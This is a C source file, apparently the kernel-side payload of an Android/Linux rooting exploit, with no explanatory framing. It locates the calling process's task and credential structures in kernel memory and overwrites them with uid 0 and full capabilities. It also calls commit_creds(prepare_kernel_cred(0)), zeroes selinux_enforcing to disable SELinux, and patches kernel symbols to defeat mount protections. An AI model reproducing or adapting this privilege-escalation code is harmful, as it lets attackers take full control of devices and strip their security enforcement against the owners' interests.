#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include "becomeRoot.h"

typedef void (*selinux_status_update_setenforceFunc)(int enforcing);
typedef void (*selnl_notify_setenforceFunc)(int val);

unsigned long lookup_sym(const char *name);

prepare_kernel_credFunc prepare_kernel_cred = NULL;
commit_credsFunc commit_creds = NULL;
int* selinux_enforcing_addr = NULL;
selinux_status_update_setenforceFunc selinux_status_update_setenforce = NULL;
selnl_notify_setenforceFunc selnl_notify_setenforce = NULL;

unsigned int* _20_kallsyms_addr = NULL;
unsigned int* _b_kallsyms_addr = NULL;
unsigned int _20_value = 0x12345678;
unsigned int _b_value = 0x12345678;
int isNeedBreakMount = 0;

int callbackCnt = 0;
char szSELinux[512] = {0};

ProcessSt gProcessSt = { 0 };

static void initAddrs(){
	prepare_kernel_cred = (prepare_kernel_credFunc)lookup_sym("prepare_kernel_cred");
	commit_creds = (commit_credsFunc)lookup_sym("commit_creds");

	selinux_enforcing_addr = (int*)lookup_sym("selinux_enforcing");
	selinux_status_update_setenforce = (selinux_status_update_setenforceFunc)lookup_sym("selinux_status_update_setenforce");
	selnl_notify_setenforce = (selnl_notify_setenforceFunc)lookup_sym("selnl_notify_setenforce");

	_20_kallsyms_addr = (unsigned int *)lookup_sym("_20");
	_b_kallsyms_addr = (unsigned int *)lookup_sym("_b1");

}

void initProcessSt() {
	prctl(0xF, "pvR_gl_king");
	getresuid(&gProcessSt.ruid, &gProcessSt.euid, &gProcessSt.suid);
	getresgid(&gProcessSt.rgid, &gProcessSt.egid, &gProcessSt.sgid);
}

static void stop_selinux(){
	if(NULL != selinux_enforcing_addr){
		*selinux_enforcing_addr = 0;
		if(NULL != selinux_status_update_setenforce){
			selinux_status_update_setenforce(0);
		}
		if(NULL != selnl_notify_setenforce){
			selnl_notify_setenforce(0);
		}
	}
}

static int getRoot_statck() {
	unsigned int stackVariable;
	unsigned int spValue;
	struct thread_info_partial* pThreadInfo;
	struct task_struct_partial_0* taskSt0;
	struct task_struct_partial_1* taskSt1;
	char* addr0;
	unsigned int* addr1;
	int offsetOfUid;
	struct credCompound* cred;
	int aInt12;
	struct task_security_struct* security;

	callbackCnt=1;

	spValue = (unsigned int) &stackVariable;
	spValue = spValue & (~0x1FFFUL);
	pThreadInfo = (struct thread_info_partial*) spValue;

	if (pThreadInfo->flags > 0xC0000000UL
			|| (unsigned long) pThreadInfo->preempt_count > 0xC0000000UL
			|| pThreadInfo->addr_limit > 0xC0000000UL) {
		return -1;
	}
	taskSt0 = (struct task_struct_partial_0*) pThreadInfo->task;
	if ((unsigned int) taskSt0 <= 0x40000001UL
			|| (unsigned long) pThreadInfo->exec_domain <= 0x40000001UL) {
		return -2;
	}

	if ((unsigned int) taskSt0->state > 0xC0000000UL
			|| taskSt0->stack != pThreadInfo) {
		return -3;
	}
	callbackCnt=2;

	addr0 = (char*) taskSt0;
	do {
		if (*(addr0++) == 'p' && *addr0 == 'v' && *(addr0 + 1) == 'R'
				&& *(addr0 + 2) == '_') {

			taskSt1 = (struct task_struct_partial_1*) (addr0 - 1 + 16
					- sizeof(struct task_struct_partial_1));

			callbackCnt=3;

			addr1 = (unsigned int*) taskSt1->cred;

			if ((unsigned int) addr1 <= 0x40000001UL) {
				return -4;
			}

			if (*(addr1 + 3) == 0x43736564//desC
					|| *(addr1 + 3) == 0x44656144) {//DaeD
				offsetOfUid = 4;
			} else {
				offsetOfUid = 1;
			}
			callbackCnt=4;

			cred = (struct credCompound*) (addr1 + offsetOfUid);

			if (cred->uid != gProcessSt.ruid || cred->gid != gProcessSt.rgid
					|| cred->suid != gProcessSt.suid
					|| cred->sgid != gProcessSt.sgid
					|| cred->euid != gProcessSt.euid
					|| cred->egid != gProcessSt.egid) {
				return -5;
			}

			callbackCnt=5;

			cred->uid = 0;
			cred->gid = 0;
			cred->suid = 0;
			cred->sgid = 0;
			cred->euid = 0;
			cred->egid = 0;
			cred->fsuid = 0;
			cred->fsgid = 0;

			cred->cap_inheritable.cap[0] = 0xFFFFFFFFU;
			cred->cap_inheritable.cap[1] = 0xFFFFFFFFU;
			cred->cap_permitted.cap[0] = 0xFFFFFFFFU;
			cred->cap_permitted.cap[1] = 0xFFFFFFFFU;
			cred->cap_effective.cap[0] = 0xFFFFFFFFU;
			cred->cap_effective.cap[1] = 0xFFFFFFFFU;
			cred->cap_bset.cap[0] = 0xFFFFFFFFU;
			cred->cap_bset.cap[1] = 0xFFFFFFFFU;

			/*
			if( 0 != szSELinux[0] ){//
				security = (struct task_security_struct*)( *(unsigned int*)(&cred->jit_keyring) );
				if( (unsigned int)security <= 0xC0008000U
						|| (unsigned long)security >= 0xFFFF0000U){
					security = cred->security;
				}
				if( (unsigned int)security > 0xC0008000U
						&& (unsigned long)security < 0xFFFF0000U){
					int ctx_value = 162;//274
					security->osid = ctx_value;
					security->sid = ctx_value;
					//security->create_sid = ctx_value;
					//security->exec_sid = ctx_value;
					//security->keycreate_sid = ctx_value;
					//security->sockcreate_sid = ctx_value;
					callbackCnt=6;
				}
			}
			*/

			if (0 == gProcessSt.label0) {
				//callbackCnt=7;
				return 1;
			}

			aInt12 = offsetOfUid + (gProcessSt.label1 << 2) + 0x11;
			if (*(addr1 + aInt12) > 0xC0000000UL) {
				*((unsigned int*) *(addr1 + aInt12)) = 1;
				*((unsigned int*) *(addr1 + aInt12) + 1) = 1;
				callbackCnt=8;
				return 1;
			}
			callbackCnt=9;
			return 1;
		}
	} while (addr0 < (char*) taskSt0 + 0x400);

	return -6;
}
static int getRoot_kallsyms() {
	if( NULL != prepare_kernel_cred && NULL != commit_creds ){
		commit_creds(prepare_kernel_cred(0));
		return 0;
	}
	return -1;
}

static void break_mount(){
	if( 0 == isNeedBreakMount ){
		return;
	}
	if(NULL != _20_kallsyms_addr){
		_20_value = *_20_kallsyms_addr;
		if(0 == *_20_kallsyms_addr){
			*_20_kallsyms_addr = 1;
		}
	}
	if(NULL != _b_kallsyms_addr){
		_b_value = *_b_kallsyms_addr;
		if(0 == *_b_kallsyms_addr){
			*_b_kallsyms_addr = 1;
		}
	}
}

int callback() {
	initAddrs();

	break_mount();

	//¹Ø±Õselinux
	if( 0 != szSELinux[0] ){
		stop_selinux();
	}
	if( 0 == getRoot_kallsyms() ){
		return 0;
	}

	return getRoot_statck();

}
